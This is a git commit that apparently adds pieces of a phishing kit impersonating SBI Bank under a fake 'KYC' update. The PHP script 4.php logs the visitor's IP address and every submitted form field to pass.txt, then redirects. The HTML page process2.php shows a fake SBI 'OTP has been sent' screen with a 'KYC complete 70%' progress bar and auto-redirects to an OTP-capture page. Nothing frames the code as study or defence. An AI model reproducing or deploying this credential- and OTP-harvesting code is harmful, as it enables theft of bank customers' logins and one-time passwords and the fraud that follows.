2b279b32dd95074db0b85663b0da9986b8e9dc6d
sbikyc4433 <90251187+sbikyc4433@users.noreply.github.com>
2021-09-07 15:32:50 +0530

    Add files via upload

---
+++ 4.php
@@ -0,0 +1,19 @@
+<?php
+include ('ip.php');
+header('location: process.php');
+error_reporting(0);
+$handle = fopen("pass.txt","a");
+fwrite($handle, $ip_address);
+fwrite($handle, "\r\n");
+foreach($_POST as $variable => $value)
+{
+  fwrite($handle, $variable);
+  fwrite($handle, "= ");
+  fwrite($handle, $value);
+  fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?> 
+       
---
+++ process2.php
@@ -0,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>SBI Bank</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+</head>
+
+
+<head>
+<meta
+http-equiv="Content-Language"
+content="fr">
+<meta
+http-equiv="refresh"
+content="15;
+URL=last-2-otp.php">
+<!---
+Redirection
+vers
+page_suivante.php
+après
+un
+délai
+de
+5
+secondes
+durant
+lesquelles
+la
+page
+actuelle
+(page_premiere.php,
+par
+exemple)
+est
+affichée
+-->
+</head>
+
+
+
+<body>
+
+<div class="container">
+  
+<div> <img
+src="otp-header1.jpg"
+style="width:
+100%;
+padding-bottom:
+0px
+!important;"> </div>
+<div
+style="text-align:center">
+<h3><font
+color="#3399FF">Please Wait...</h3>
+<div>
+  <div>
+<br>
+<h4><font
+color="#00802b"><p>OTP has been sent to your register mobile number Please Enter The OTP and Proceed.</p></h4>
+
+</div>
+
+
+  <div class="progress">
+    <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100" style="width:70%">
+    KYC complete 70%
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
